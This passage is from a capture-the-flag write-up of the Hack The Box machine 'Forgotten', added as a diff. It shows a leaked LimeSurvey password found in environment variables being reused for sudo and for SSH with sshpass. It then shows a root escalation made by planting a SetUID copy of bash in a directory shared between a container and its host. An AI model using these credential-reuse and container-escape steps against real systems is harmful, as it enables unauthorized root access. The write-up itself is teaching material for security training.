+PHP_INI_DIR=/usr/local/etc/php
+GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
+PHP_LDFLAGS=-Wl,-O1 -pie
+PWD=/
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+LS_COLORS=
+PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make  pkg-config               re2c
+LIMESURVEY_PASS=5W5HN4K4GCXf9E
+PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
+LIMESURVEY_ADMIN=limesvc
+APACHE_RUN_GROUP=limesvc
+APACHE_LOCK_DIR=/var/lock/apache2
+SHLVL=3
+PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_ENVVARS=/etc/apache2/envvars
+APACHE_RUN_USER=limesvc
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
+PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
+_=/usr/bin/env
+OLDPWD=/home
+</span></code></pre></div></div>
+<h3 id="ssh">SSH</h3>
+<p>This password actually does work for <code class="language-plaintext highlighter-rouge">sudo</code> here:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+</span><span class="c">    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+</span><span class="go">
+[sudo] password for limesvc: 
+Matching Defaults entries for limesvc on efaa6f5097ed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User limesvc may run the following commands on efaa6f5097ed:
+    (ALL : ALL) ALL
+</span></code></pre></div></div>
+<p>And I can get a shell as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-i</span>
+<span class="go">root@efaa6f5097ed:~#
+</span></code></pre></div></div>
+<p>But more interestingly, it works over SSH for the host:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'5W5HN4K4GCXf9E'</span> ssh limesvc@10.129.171.142
+<span class="go">Warning: Permanently added '10.129.171.142' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)
+...[snip]...
+</span><span class="gp">limesvc@forgotten:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">3ab41a7c************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="users-1">Users</h4>
+<p>There are two users with home directories in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">limesvc  ubuntu
+</span></code></pre></div></div>
+<p>limesvc can’t access <code class="language-plaintext highlighter-rouge">ubuntu</code>, and there’s nothing interesting in <code class="language-plaintext highlighter-rouge">limesvc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:/home$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f
+<span class="go">./limesvc/.cache/motd.legal-displayed
+./limesvc/.profile
+./limesvc/.bashrc
+./limesvc/.bash_logout
+./limesvc/user.txt
+find: ‘./ubuntu’: Permission denied
+</span></code></pre></div></div>
+<p>limesvc can’t run <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">[sudo] password for limesvc:
+Sorry, user limesvc may not run sudo on localhost.
+</span></code></pre></div></div>
+<h4 id="filesystem">Filesystem</h4>
+<p>The <code class="language-plaintext highlighter-rouge">/opt</code> directory has <code class="language-plaintext highlighter-rouge">containerd</code> (typically associated with Docker) and a <code class="language-plaintext highlighter-rouge">limesurvey</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:/$</span><span class="w"> </span><span class="nb">ls </span>opt/
+<span class="go">containerd  limesurvey  limesurvey6.3.7+231127.zip
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">limesurvey</code> directory looks the same as the one on the container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:/opt$</span><span class="w"> </span><span class="nb">ls </span>limesurvey
+<span class="go">LICENSE      admin        docs         installer  node_modules      psalm-all.xml     setdebug.php  upload
+README.md    application  gulpfile.js  locale     open-api-gen.php  psalm-strict.xml  themes        vendor
+SECURITY.md  assets       index.php    modules    plugins           psalm.xml         tmp
+</span></code></pre></div></div>
+<p>From within the container, I’ll write a file to the web directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/var/www/html/survey$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"hello host!"</span> <span class="o">&gt;</span> 0xdf 
+</code></pre></div></div>
+<p>It’s visible on the host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:/opt$</span><span class="w"> </span><span class="nb">cat </span>limesurvey/0xdf 
+<span class="go">hello host!
+</span></code></pre></div></div>
+<p>It’s owned by the same user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:/opt$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> limesurvey/0xdf
+<span class="go">-rw-r--r-- 1 limesvc limesvc 12 Sep 17 00:49 limesurvey/0xdf
+</span></code></pre></div></div>
+<h3 id="docker--host-share-abuse">Docker / Host Share Abuse</h3>
+<p>As the root user in the container, I’ll make a copy of Bash inside the shared web directory, and set it as SetUID / SetGID:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@efaa6f5097ed:~#</span><span class="w"> </span><span class="nb">rm</span> /var/www/html/survey/0xdf
+<span class="gp">root@efaa6f5097ed:~#</span><span class="w"> </span><span class="nb">cp</span> /bin/bash /var/www/html/survey/0xdf
+<span class="gp">root@efaa6f5097ed:~#</span><span class="w"> </span><span class="nb">chmod </span>6777 /var/www/html/survey/0xdf
+<span class="gp">root@efaa6f5097ed:~#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /var/www/html/survey/0xdf
+<span class="go">-rwsrwsrwx 1 root root 1234376 Sep 17 00:51 /var/www/html/survey/0xdf
+</span></code></pre></div></div>
+<p>From the host, it’s there, and with the same permissions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:/opt$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> limesurvey/0xdf
+<span class="go">-rwsrwsrwx 1 root root 1234376 Sep 17 00:51 limesurvey/0xdf
+</span></code></pre></div></div>
+<p>I’ll run with <code class="language-plaintext highlighter-rouge">-p</code> to not drop privs and get a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@forgotten:/opt$</span><span class="w"> </span>limesurvey/0xdf <span class="nt">-p</span>
+<span class="gp">0xdf-5.1#</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">0xdf-5.1# </span><span class="nb">cat</span> /root/root.txt
+<span class="go">0c628afe************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/09/16/htb-forgotten.html"></a>
+</article>
